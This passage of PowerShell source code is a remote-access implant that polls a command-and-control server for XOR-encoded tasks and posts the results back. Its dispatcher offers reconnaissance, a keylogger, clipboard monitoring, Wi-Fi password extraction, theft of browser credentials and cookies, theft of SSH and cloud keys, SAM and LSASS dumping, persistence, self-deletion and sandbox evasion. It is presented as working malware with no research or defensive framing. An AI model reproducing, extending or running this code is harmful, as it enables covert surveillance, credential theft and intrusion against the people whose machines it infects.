    $q = (query session 2>&1) | Out-String
    $l = Get-CimInstance Win32_LogonSession -EA SilentlyContinue |
         Select-Object LogonId, LogonType, StartTime | Format-Table -Auto | Out-String
    return "=== Active Sessions (query session) ===`n$q`n=== Logon Sessions ===`n$l"
}

function getFirewallRules {
    $r = Get-NetFirewallRule -EA SilentlyContinue | Where-Object Enabled -eq 'True' |
         Select-Object DisplayName, Direction, Action, Profile | Sort-Object Direction |
         Format-Table -Auto | Out-String
    return if ($r) { $r } else { "[no firewall rules or access denied]" }
}

# ─── MAIN EXECUTOR ────────────────────────────────────────────────────────────

function run([string]$cmd) {
    $out = ''; $err = $false
    try {
        switch -Regex ($cmd.Trim()) {

            # ── Liveness ──────────────────────────────────────────────────────
            '^ping$'       { $out = "pong | $script:id | $(Get-Date -Format o)" }

            # ── Recon ─────────────────────────────────────────────────────────
            '^whoami$'     { $out = "$env:USERDOMAIN\$env:USERNAME" }
            '^hostname$'   { $out = $env:COMPUTERNAME }
            '^sysinfo$'    { $out = getMeta | ConvertTo-Json -Depth 5 }
            '^ps$' {
                $out = Get-Process |
                       Select-Object Name, Id,
                           @{N='CPU';   E={[math]::Round($_.CPU,1)}},
                           @{N='RAM_MB';E={[math]::Round($_.WorkingSet/1MB,1)}} |
                       Sort-Object CPU -Desc | Format-Table -Auto | Out-String
            }
            '^netstat$'  { $out = netstat -ano 2>&1 | Out-String }
            '^ipconfig$' { $out = ipconfig /all 2>&1 | Out-String }
            '^arp$'      { $out = arp -a 2>&1 | Out-String }
            '^route$'    { $out = route print 2>&1 | Out-String }
            '^users$'    { $out = Get-LocalUser  | Format-Table Name, Enabled, LastLogon -Auto | Out-String }
            '^groups$'   { $out = Get-LocalGroup | Format-Table Name, Description -Auto | Out-String }
            '^drives$'   { $out = Get-PSDrive -PSProvider FileSystem | Format-Table -Auto | Out-String }
            '^tasks$'    { $out = Get-ScheduledTask | Where-Object State -eq Running | Format-Table TaskName, TaskPath -Auto | Out-String }
            '^env$'      { $out = Get-ChildItem Env: | Format-Table Name, Value -Auto | Out-String }
            '^av$' {
                $avs = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA SilentlyContinue
                $out = if ($avs) { $avs | Format-Table displayName, productState -Auto | Out-String } else { '[none detected]' }
            }
            '^clipboard$' {
                $out = Get-Clipboard -Raw -EA SilentlyContinue
                if (!$out) { $out = '[empty]' }
            }
            '^history$' {
                $h = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                $out = if (Test-Path $h) { Get-Content $h -Tail 100 | Out-String } else { '[no history]' }
            }
            '^wifi$' {
                $out = ''
                netsh wlan show profiles | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object {
                    $n    = $_.Matches.Groups[1].Value.Trim()
                    $p    = netsh wlan show profile name="$n" key=clear 2>&1 | Select-String 'Key Content\s*:\s*(.+)'
                    $pass = if ($p) { $p.Matches.Groups[1].Value.Trim() } else { '[no password]' }
                    $out += "[$n] $pass`n"
                }
                if (!$out) { $out = '[no wifi profiles]' }
            }
            '^creds$'      { $out = cmdkey /list 2>&1 | Out-String }
            '^screenshot$' { $out = doScreenshot }

            # ── Stateful Shell (persistent runspace) ──────────────────────────
            '^shell\s+([\s\S]+)' { $out = rsExec $Matches[1] }
            '^cd\s+(.+)' {
                $path = $Matches[1].Trim()
                $out  = rsExec "Set-Location '$path'; (Get-Location).Path"
            }
            '^pwd$' { $out = rsExec '(Get-Location).Path' }
            '^set-var\s+(\S+)\s+([\s\S]+)' {
                $vname = $Matches[1]; $vval = $Matches[2]
                rsExec "`$$vname = '$vval'" | Out-Null
                $out = "Var `$$vname set in runspace"
            }
            '^get-var\s+(\S+)' {
                $out = rsExec "`$$($Matches[1])"
            }
            '^load-module\s+(\S+)' { $out = loadModule $Matches[1] }
            '^list-modules$' {
                $out = if ($script:loadedModules.Count -gt 0) { $script:loadedModules -join "`n" } else { '[no modules loaded]' }
            }
            '^reset-shell$' {
                $script:rs.Close()
                $script:rs.Dispose()
                $script:rs = [runspacefactory]::CreateRunspace()
                $script:rs.ApartmentState = 'STA'
                $script:rs.Open()
                $script:loadedModules = @()
                $out = "[runspace reset -- all state and modules cleared]"
            }

            # ── File System ───────────────────────────────────────────────────
            '^ls\s*(.*)' {
                $path = if ($Matches[1].Trim()) { $Matches[1].Trim() } else { rsExec '(Get-Location).Path' }
                $out  = Get-ChildItem -Path $path -Force -EA Stop |
                        Select-Object Mode, LastWriteTime,
                            @{N='Size';E={if($_.PSIsContainer){'<DIR>'}else{$_.Length}}},
                            Name | Format-Table -Auto | Out-String
            }
            '^(cat|type)\s+(.+)' { $out = Get-Content -Path $Matches[2].Trim() -Raw -EA Stop }
            '^upload\s+(.+)'     { $out = uploadChunked $Matches[1].Trim() }
            '^download\s+(\S+)\s*(\S*)' {
                $dest = if ($Matches[2]) { $Matches[2] } else { "$env:TEMP\$(Split-Path $Matches[1] -Leaf)" }
                (New-Object Net.WebClient).DownloadFile($Matches[1], $dest)
                $out = "Saved: $dest"
            }

            # ── Execution ─────────────────────────────────────────────────────
            '^cmd\s+([\s\S]+)' { $out = (cmd.exe /c $Matches[1] 2>&1) | Out-String }
            '^kill\s+(\d+)' { Stop-Process -Id ([int]$Matches[1]) -Force; $out = "Killed $($Matches[1])" }
            '^sleep\s+(\d+)' { Start-Sleep -Seconds ([int]$Matches[1]); $out = 'Done' }

            # ── Background Jobs ───────────────────────────────────────────────
            '^bg\s+([\s\S]+)' { $out = bgStart $Matches[1] }
            '^jobs$'          { $out = bgList }
            '^job\s+(\S+)'    { $out = bgGetResult $Matches[1] }

            # ── Keylogger ─────────────────────────────────────────────────────
            '^keylog start$'  { $out = klStart }
            '^keylog stop$'   { $out = klStop }
            '^keylog dump$'   { $out = klDump }

            # ── Clipboard Watcher ─────────────────────────────────────────────
            '^clip-watch start$' { $out = clipStart }
            '^clip-watch stop$'  { $out = clipStop }
            '^clip-watch dump$'  { $out = clipDump }

            # ── Dynamic Reconfiguration ───────────────────────────────────────
            '^set-interval\s+(\d+)' {
                $script:pollInt = [int]$Matches[1]
                $out = "Poll interval -> $($Matches[1])s"
            }
            '^set-jitter\s+(\d+)' {
                $script:jitter = [int]$Matches[1]
                $out = "Jitter -> $($Matches[1])s"
            }
            '^set-c2\s+(\S+)' {
                $script:c2Url = $Matches[1]
                $out = "C2 URL -> $($Matches[1])"
            }
            '^agent-info$' {
                $uptime = [math]::Round(((Get-Date) - $script:startTime).TotalMinutes, 1)
                $bgKeys = $script:bgJobs.Keys -join ', '
                $out    = [ordered]@{
                    id         = $script:id
                    uptime_min = $uptime
                    c2_url     = $script:c2Url
                    interval   = $script:pollInt
                    jitter     = $script:jitter
                    bg_jobs    = if ($bgKeys) { $bgKeys } else { 'none' }
                    keylogger  = if ($script:klJob -and $script:klJob.State -eq 'Running') { 'RUNNING' } else { 'stopped' }
                    clip_watch = if ($script:clipJob -and $script:clipJob.State -eq 'Running') { 'RUNNING' } else { 'stopped' }
                    modules    = if ($script:loadedModules.Count -gt 0) { $script:loadedModules -join ', ' } else { 'none' }
                    runspace   = $script:rs.RunspaceAvailability
                    pwd        = rsExec '(Get-Location).Path'
                } | ConvertTo-Json
            }

            # ── Persistence & Cleanup ─────────────────────────────────────────
            '^persist$'    { $out = doPersist }
            '^unpersist$'  { $out = doUnpersist }
            '^kill-agent$' {
                $out = "Agent $script:id stopping"
                klStop | Out-Null
                clipStop | Out-Null
                $script:running = $false
            }
            '^selfdel$' {
                $me = $MyInvocation.ScriptName
                Start-Process cmd -Args "/c ping -n 3 127.0.0.1 >nul & del `"$me`"" -WindowStyle Hidden
                $out = 'Self-delete queued'
            }

            # ── Credential Exfiltration ───────────────────────────────────────
            '^browser-creds$'   { $out = getBrowserCreds }
            '^browser-cookies$' { $out = getBrowserCookies }
            '^ssh-keys$'        { $out = getSSHKeys }
            '^cloud-keys$'      { $out = getCloudKeys }
            '^sam-dump$'        { $out = doSAMDump }
            '^lsass-dump$'      { $out = doLSASSDump }

            # ── Document & Code Discovery ─────────────────────────────────────
            '^find-docs\s*(\S*)\s*(\S*)' {
                $ext_  = if ($Matches[1]) { $Matches[1] } else { '' }
                $path_ = if ($Matches[2]) { $Matches[2] } else { $env:USERPROFILE }
                $out   = findDocs $ext_ $path_
            }
            '^find-code\s*(\S*)' {
                $path_ = if ($Matches[1]) { $Matches[1] } else { $env:USERPROFILE }
                $out   = findCode $path_
            }
            '^find-secrets\s*(\S*)' {
                $path_ = if ($Matches[1]) { $Matches[1] } else { $env:USERPROFILE }
                $out   = findSecrets $path_
            }

            # ── Network Recon ─────────────────────────────────────────────────
            '^dns-cache$'    { $out = getDNSCache }
            '^shares$'       { $out = getShares }
            '^domain-info$'  { $out = getDomainInfo }
            '^ldap-users$'   { $out = getLDAPUsers }
            '^ldap-groups$'  { $out = getLDAPGroups }
            '^rdp-sessions$' { $out = getRDPSessions }
            '^firewall$'     { $out = getFirewallRules }
            '^fetch-url\s+(\S+)' {
                $fetchUrl = $Matches[1].Trim()
                try {
                    $wc = New-Object Net.WebClient
                    $wc.Headers.Add('User-Agent', $script:ua)
                    $out = $wc.DownloadString($fetchUrl)
                } catch { $out = "[fetch-url error] $_" }
            }

            default {
                $out = @"
[unknown command]: $cmd

Built-in recon:   ping whoami hostname sysinfo ps netstat ipconfig arp route users groups drives tasks env av clipboard history wifi creds screenshot
Stateful shell:   shell <ps>  |  cd <path>  |  pwd  |  set-var <n> <v>  |  get-var <n>  |  reset-shell
File system:      ls [path]  |  cat <path>  |  upload <path>  |  download <url> [dest]
Execution:        cmd <cmd>  |  kill <pid>  |  sleep <sec>
Background jobs:  bg <cmd>  |  jobs  |  job <id>
Keylogger:        keylog start  |  keylog stop  |  keylog dump
Clipboard watch:  clip-watch start  |  clip-watch stop  |  clip-watch dump
Modules:          load-module <url>  |  list-modules
Reconfig:         set-interval <s>  |  set-jitter <s>  |  set-c2 <url>  |  agent-info
Persistence:      persist  |  unpersist  |  kill-agent  |  selfdel
Cred exfil:       browser-creds | browser-cookies | ssh-keys | cloud-keys | sam-dump | lsass-dump
Discovery:        find-docs [ext] [path]  |  find-code [path]  |  find-secrets [path]
Network recon:    dns-cache | shares | domain-info | ldap-users | ldap-groups | rdp-sessions | firewall | fetch-url <url>
"@
            }
        }
    } catch {
        $out = "[ERROR] $($_.Exception.Message)"; $err = $true
    }
    return @{ output = if ($out) { $out.TrimEnd() } else { '[no output]' }; error = $err }
}

# ─── MAIN ─────────────────────────────────────────────────────────────────────

if (isSandbox) { exit 0 }

$meta = [Uri]::EscapeDataString((getMeta | ConvertTo-Json -Compress))
xGet "$script:c2Url`?action=register&agent_id=$script:id&metadata=$meta" | Out-Null

$errs = 0
while ($script:running) {
    try {
        # 1. Poll for command
        $task = xGet "$script:c2Url`?action=poll&agent_id=$script:id&token=$script:token"
        if ($task -and $task.cmd_id) {
            $plainCmd = xorDecode $task.command $script:xorKey
            $r        = run $plainCmd
            $encOut   = xorEncode $r.output $script:xorKey
            xPost $script:c2Url @{ agent_id=$script:id; cmd_id=$task.cmd_id; output=$encOut; error=$r.error; metadata=(getMeta) }
            $errs = 0
        }

        # 2. Auto-post completed background jobs
        bgAutoPost

        # 3. Auto-exfil keylogger buffer if threshold reached
        klAutoExfil

    } catch {
        $errs++
        if ($errs -ge 5) { Start-Sleep -Seconds ([Math]::Min(60 * $errs, 300)); $errs = 0; continue }
    }

    Start-Sleep -Seconds ($script:pollInt + (Get-Random -Min 0 -Max $script:jitter))
}
